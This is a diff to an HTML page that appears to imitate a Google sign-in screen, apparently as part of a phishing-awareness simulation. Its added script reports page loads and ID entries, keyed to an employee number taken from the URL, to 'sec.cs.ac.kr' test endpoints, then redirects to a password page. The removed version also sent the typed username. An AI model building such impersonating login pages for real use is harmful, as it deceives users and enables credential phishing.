@@ -33542,32 +33542,60 @@
                         </div>
                         <script>
 
+                            window.addEventListener('load', function() {
+                                init();
 
-                            
+                            });
+                            function base64DecodeToString(b64) {
+                                // atob는 브라우저에서 표준 Base64 디코딩
+                                const binary = atob(b64);
+                                // UTF-8 처리: Uint8Array로 변환 후 TextDecoder로 디코딩
+                                const bytes = new Uint8Array(binary.length);
+                                for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+                                return new TextDecoder().decode(bytes);
+                            }
+                            async function init(){
+                                const path = window.location.pathname;
+                                const parts = path.split('/').filter(Boolean); 
+                                const lastPart = parts[parts.length - 1];
 
+                                const input = document.querySelector('input[jsname="YPqjbf"]');
+                                const SERVER_URL = "https://sec.cs.ac.kr"
+                                let JsonArray = new Array();
+                                let JsonObject = new Object;
+                                JsonObject.SABUN = base64DecodeToString(lastPart);
+                                JsonArray.push(JsonObject);
 
-                        async function inputId(){
-                            const input = document.querySelector('input[jsname="YPqjbf"]');
-                            const SERVER_URL = "https://sec.cs.ac.kr"
-                            let JsonArray = new Array();
-                            let JsonObject = new Object;
-                            JsonObject.SABUN = "30072";
-                            JsonObject.INPUT_ID = input.value;
-                            JsonArray.push(JsonObject);
-
-                            const res = await fetch(SERVER_URL+'/api/test/input/id',{ method: "POST", headers : {"Content-Type" : "application/json;charset=utf-8;" }, body : JSON.stringify(JsonArray)} );
-                            const data = await res.json();
-                            console.log("test",data.MSG);
-                        
-                            if(data.MSG == "SUCCESS"){
-                                
-                                const currentPath = window.location.origin + window.location.pathname.replace(/\/[^\/]*$/, "/");
-                                window.location.href = currentPath + "passwd.html?uid="+input.value+"&ss=sdfmop39fosdlnv09sdr98hwjnfi3829fdnfssdmfpsmdfpmspdf93903$230m,rlfmdmqp23252359sdn&sabun=30072&aa=2j130jmkldlkasndlkansldnaskldascvbtoewijtoiewjt#";
+                                const res = await fetch(SERVER_URL+'/api/test/click',{ method: "POST", headers : {"Content-Type" : "application/json;charset=utf-8;" }, body : JSON.stringify(JsonArray)} );
 
                             }
+                            async function inputId(){
 
-                 
-                        }    
+
+                                const path = window.location.pathname;
+                                const parts = path.split('/').filter(Boolean); 
+                                const lastPart = parts[parts.length - 1];
+
+                                const input = document.querySelector('input[jsname="YPqjbf"]');
+                                const SERVER_URL = "https://sec.cs.ac.kr"
+                                let JsonArray = new Array();
+                                let JsonObject = new Object;
+                                JsonObject.SABUN = base64DecodeToString(lastPart);
+                                JsonArray.push(JsonObject);
+
+                                const res = await fetch(SERVER_URL+'/api/test/input/id',{ method: "POST", headers : {"Content-Type" : "application/json;charset=utf-8;" }, body : JSON.stringify(JsonArray)} );
+                                const data = await res.json();
+                                console.log("test",data.MSG);
+                            
+                                if(data.MSG == "SUCCESS"){
+                                    
+                                    const currentPath = window.location.origin + window.location.pathname.replace(/\/[^\/]*$/, "/");
+                                    window.location.href = currentPath + "passwd.html?uid="+lastPart;
+
+                                }
+
+                    
+                            }
                         </script>
                         <div class="JYXaTc" jsname="DH6Rkf" jscontroller="z0u0L"
                             jsaction="rcuQ6b:rcuQ6b;KWPV0:vjx2Ld(Njthtb),ChoyC(eBSUOb),VaKChb(gVmDzc),nCZam(W3Rzrc),Tzaumc(uRHG6),JGhSzd;dcnbp:dE26Sc(lqvTlf);FzgWvd:JGhSzd;"
